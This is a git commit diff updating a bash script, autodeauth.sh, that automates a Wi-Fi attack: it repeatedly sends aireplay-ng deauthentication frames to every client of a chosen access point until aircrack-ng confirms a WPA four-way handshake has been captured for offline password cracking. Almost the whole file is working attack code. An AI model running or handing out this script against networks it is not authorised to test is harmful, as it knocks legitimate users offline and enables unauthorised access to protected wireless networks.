148fb89449d0a16cba85e3055a539f86c1f90b65
zachsis <zachary.hatsis@gmail.com>
2015-08-18 21:04:07 -0600

    Update autodeauth.sh
    Added a lot of changes to catch exceptions that were popping up

--- autodeauth.sh
+++ autodeauth.sh
@@ -1,16 +1,28 @@
 #!/bin/bash
 #Need to get the BSSID Name
-echo "BSSID Name? (Case Sensitive): "
+echo '[?] BSSID Name? (Case Sensitive): '
 read BSSIDNAME
-
 BSSID=$(cat "$1" | awk -F',' 'NR>2{print $1}' | sed -e '/Station MAC/d' -e '/BSSID/d' -e '/\n/d' | sed -n 1p)
 
+SUCCESS=$(aircrack-ng "${BSSIDNAME}"-01.cap -w fakewordlist | grep -e "WPA \([1-9] handshake\)" )
+
+
 until [ -n "$SUCCESS" ]; do
-  for STATION in $(cat "$1" | awk -F',' 'NR>5{print $1}' | sed -e '/Station MAC/d' -e '/BSSID/d' | sed -e '/^.$/d' ); do
-    aireplay-ng --deauth 5 -a $BSSID -c $STATION wlan1mon;
-  done
-SUCCESS=$(aircrack-ng "${BSSIDNAME}-01.cap" -w fakewordlist | grep "WPA (. handshake)")
- if [ -z "$SUCCESS" ]; 
-  sleep 5m
- fi
+STATIONLIST=$(cat "$1" | awk -F',' 'NR>5{print $1}' | sed -e '/Station MAC/d' -e '/BSSID/d' | sed -e '/^.$/d')
+  
+  if [ -n "$STATIONLIST" ]; then 
+  	echo -e "[+] \e[31mStations connected to $BSSID\e[0m"
+	echo -e "[+] \e[31mhammering $BSSID\e[0m"
+  	for STATION in $(cat "$1" | awk -F',' 'NR>5{print $1}' | sed -e '/Station MAC/d' -e '/BSSID/d' | sed -e '/^.$/d'); do
+	  	aireplay-ng --deauth 7 -a $BSSID -c $STATION wlan1mon
+	  	sleep 1m
+  	done 
+  else 
+  	echo "[!] No Stations connected to $BSSID yet. sleeping for 30s"
+  	sleep 10s
+  fi
+  
+SUCCESS=$(aircrack-ng "${BSSIDNAME}"-01.cap -w fakewordlist | grep -e "WPA ([1-9] handshake)" )
 done
+
+echo -e "[+] \e[31m4way handshake captured!\e[25m\e[0m"
